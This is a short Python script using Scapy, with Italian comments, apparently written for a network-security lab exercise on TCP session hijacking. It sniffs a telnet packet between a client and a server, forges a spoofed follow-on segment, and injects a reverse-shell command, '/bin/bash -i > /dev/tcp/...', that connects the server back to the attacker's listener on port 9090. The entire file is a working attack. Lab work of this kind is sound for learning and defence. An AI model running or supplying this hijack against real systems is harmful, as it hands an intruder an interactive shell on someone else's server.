#!/usr/bin/env python3
from scapy.all import *

# Imposta questi IP in base alla tua topologia del lab
CLIENT_IP = "10.9.0.6"   # IP della vittima (client telnet)
SERVER_IP = "10.9.0.5"   # IP del server telnet
ATTACKER_IP = "10.9.0.1" # IP della tua macchina (nc listener)

def callback(pkt):
    if not pkt.haslayer(TCP):
        return
    # Inietta solo sui pacchetti che vanno dal client verso il server
    if pkt[IP].src != CLIENT_IP or pkt[IP].dst != SERVER_IP:
        return

    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(
        sport=pkt[TCP].sport,
        dport=pkt[TCP].dport,
        flags="PA",
        seq=pkt[TCP].seq + len(pkt[TCP].payload),
        ack=pkt[TCP].ack
    )
    data = f"\r /bin/bash -i > /dev/tcp/{ATTACKER_IP}/9090 0<&1 2>&1\r"
    spoofed_pkt = ip / tcp / data
    spoofed_pkt.show()
    send(spoofed_pkt, verbose=0)

sniff(iface='br-9ee9c232b895', filter="tcp port 23", prn=callback, count=1)